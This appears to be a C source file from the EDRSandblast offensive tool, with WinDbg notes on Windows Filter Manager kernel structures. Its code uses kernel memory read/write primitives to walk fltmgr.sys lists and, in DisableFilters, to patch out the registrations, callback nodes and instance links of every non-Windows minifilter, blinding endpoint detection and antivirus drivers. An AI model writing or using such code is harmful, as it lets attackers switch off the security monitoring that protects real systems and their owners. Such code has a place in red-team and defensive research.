/*
 * FltGlobals + 0x58 + 0x68 (_GLOBALS.FrameList.rList) => _FLTP_FRAME.Links
dps fltmgr!FltGlobals + 0xC0 l1

dt fltmgr!_FLTP_FRAME ffff9e81`25cd0028-8
  > (_FLTP_FRAME.Links-8)

 * _FLTP_FRAME.RegisteredFilters.rList => _FLT_FILTER.Base.PrimaryLink
dps poi(fltmgr!FltGlobals + 0xC0)-8+48+68 l3
dt fltmgr!_FLT_FILTER ffff9e81`25cd0020-10
  > _FLT_FILTER.Base.PrimaryLink-10

dps ffff9e81`25d8e028-10+68+68 l3
  > _FLT_FILTER.InstanceList.rList => _FLT_INSTANCE.FilterLink
  (**different from volume which points to _FLT_INSTANCE.Base.PrimaryLink**)

dt fltmgr!_FLT_INSTANCE ffff9e81`25cd0020-70
  > _FLT_FILTER.InstanceList.rList - 70

 * _FLTP_FRAME.AttachedVolumes.rList => _FLT_VOLUME.Base.PrimaryLink
dps poi(fltmgr!FltGlobals + 0xC0)-8+c8+68 l3
dt fltmgr!_FLT_VOLUME ffff9e81`25cd0020-10
  > _FLT_VOLUME.Base.PrimaryLink-10

dps ffff9e81`25d8e028-10+a0+68 l3
  > _FLT_VOLUME.InstanceList.rList => _FLT_INSTANCE.Base.PrimaryLink
  > Different from _FLT_FILTER.InstanceList.rList

dt fltmgr!_FLT_INSTANCE ffff9e81`25cd0020-10
  > _FLT_VOLUME.InstanceList.rList - 10

 */
#include <Tchar.h>
#include <Windows.h>

#include "../EDRSandblast.h"
#include "IsEDRChecks.h"
#include "PdbSymbols.h"
#include "FltmgrOffsets.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "FileVersion.h"
#include "KernelCallbacks.h"

#include "MinifilterCallbacks.h"

#include "./utils.h"

TCHAR const* WIN_FILTERS[] = {
  _T("npsvctrig"),
  _T("FileInfo"),
  _T("luafv"),
  _T("FileCrypt"),
  _T("storqosflt"),
  _T("bindflt"),
  _T("wcifs"),
  _T("CldFlt"),
  _T("Wof")
};

TCHAR const* FLTMGR_DRIVER = _T("fltmgr.sys");
DWORD64 BaseAddr = NULL;

BOOL EnumFilters(const DWORD64 FLTP_FRAME) {
  DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];

  for(
      DWORD64 FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_head);
      FLT_FILTER_Base_PrimaryLink != FLT_FILTER_head;
      FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_Base_PrimaryLink)
     ) {
    DWORD64 FLT_FILTER = FLT_FILTER_Base_PrimaryLink - g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink];

    wchar_t driverName[STRING_MAX_LENGTH] = { 0 };
    ReadUnicodeString(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Name], driverName);
    if (includesString(WIN_FILTERS, _countof(WIN_FILTERS), driverName)) continue;

    _tprintf_or_not(TEXT("[+] Filter Driver: %s\n"), driverName);

    // Clear registration
    DWORD64 pRegistration = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Registration];
    const DWORD64 Registration = ReadMemoryDWORD64(pRegistration);
    if (Registration == 0) {
      continue;
    }
    return TRUE;
  }

  return FALSE;
}

BOOL EnumMinifilterCallbacks() {
  if (!FltmgrOffsetsArePresent()) {
    _putts_or_not(TEXT("FltMgr offsets not loaded ! Aborting..."));
    return FALSE;
  }
  DebugBreak();

  BaseAddr = FindDriverBaseAddress(FLTMGR_DRIVER);
  if (BaseAddr == 0) {
    _putts_or_not(TEXT("Base address of fltMgr.sys can not be found! Aborting..."));
    return FALSE;
  }

  _putts_or_not(TEXT("[+] Enumerating Minifilter callbacks"));
  const DWORD64 FLTP_FRAME__head = BaseAddr + g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
  for(
      DWORD64 FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__head);
      FLTP_FRAME__Links != FLTP_FRAME__head;
      FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__Links)
     ) {
    const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];
    if (EnumFilters(FLTP_FRAME)) {
      return TRUE;
    }
  }

  return FALSE;
}


BOOL DisableFilters(const DWORD64 FLTP_FRAME) {
  DWORD64 FLT_FILTER_head = FLTP_FRAME + g_fltmgrOffsets[FLTOS_FLTP_FRAME__RegisteredFilters] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];

  for(
      DWORD64 FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_head);
      FLT_FILTER_Base_PrimaryLink != FLT_FILTER_head;
      FLT_FILTER_Base_PrimaryLink = ReadMemoryDWORD64(FLT_FILTER_Base_PrimaryLink)
     ) {
    DWORD64 FLT_FILTER = FLT_FILTER_Base_PrimaryLink - g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink];

    wchar_t driverName[STRING_MAX_LENGTH] = { 0 };
    ReadUnicodeString(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Name], driverName);
    if (includesString(WIN_FILTERS, _countof(WIN_FILTERS), driverName)) continue;

    _tprintf_or_not(TEXT("[+] Filter Driver: %s\n"), driverName);

    // Clear registration
    DWORD64 pRegistration = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__Registration];
    const DWORD64 Registration = ReadMemoryDWORD64(pRegistration);
    if (Registration == 0) {
      continue;
    }
    Patch(pRegistration, 0);

    DWORD64 FLT_INSTANCE_head = FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
    DWORD count = ReadMemoryDWORD(FLT_FILTER + g_fltmgrOffsets[FLTOS_FLT_FILTER__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount]);
    if (count == 0) {
      _tprintf_or_not(TEXT("[+] Clean\n"));
      continue;
    }

    for(
        DWORD64 FLT_INSTANCE__FilterLink = ReadMemoryDWORD64(FLT_INSTANCE_head);
        FLT_INSTANCE__FilterLink != FLT_INSTANCE_head;
        FLT_INSTANCE__FilterLink = ReadMemoryDWORD64(FLT_INSTANCE__FilterLink)
       ) {
      DWORD64 FLT_INSTANCE = FLT_INSTANCE__FilterLink - g_fltmgrOffsets[FLTOS_FLT_INSTANCE__FilterLink];

      // Remove from volume's Callbacks
      const DWORD64 CallbackNodes = FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__CallbackNodes];
      for (int i = 0; i < 0x32; i++) {
        DWORD64 CallbackNode = ReadMemoryDWORD64(CallbackNodes + sizeof(PVOID) * i);
        if (!CallbackNode) continue;

        removeDoubleLinkedNode(CallbackNode);
      }

      // Remove from volume's instance list
      DWORD64 FLT_VOLUME = ReadMemoryDWORD64(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_FLT_INSTANCE__Volume]);
      DWORD64 pFLT_VOLUME_InstanceList_count = FLT_VOLUME + g_fltmgrOffsets[FLTOS_FLT_VOLUME__InstanceList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rCount];
      DWORD countVol = ReadMemoryDWORD(pFLT_VOLUME_InstanceList_count);
      PatchExplicit(pFLT_VOLUME_InstanceList_count, (Value){ .dword = countVol - 1 }, (Value){ .dword = countVol }, S4);

      removeDoubleLinkedNode(FLT_INSTANCE + g_fltmgrOffsets[FLTOS_OBJECT_PrimaryLink]);
    }

    // Clear instance list from this driver
    Patch(FLT_INSTANCE_head, FLT_INSTANCE_head);
    Patch(FLT_INSTANCE_head + 8, FLT_INSTANCE_head);
    PatchSize(FLT_INSTANCE_head + 16, (Value){ .dword = 0 }, S4);
  }
}

void DisableMinifilterCallbacks() {
  _tprintf_or_not(TEXT("[+] [MinifilterCallblacks] Disabling...\n"));
  DebugBreak();

  const DWORD64 FLTP_FRAME__head = BaseAddr + g_fltmgrOffsets[FLTOS_FltGlobals] + g_fltmgrOffsets[FLTOS_GLOBALS__FrameList] + g_fltmgrOffsets[FLTOS_RESOURCE_LIST_HEAD__rList];
  for(
      DWORD64 FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__head);
      FLTP_FRAME__Links != FLTP_FRAME__head;
      FLTP_FRAME__Links = ReadMemoryDWORD64(FLTP_FRAME__Links)
     ) {
    const DWORD64 FLTP_FRAME = FLTP_FRAME__Links - g_fltmgrOffsets[FLTOS_FLTP_FRAME__Links];
    DisableFilters(FLTP_FRAME);
  }
}
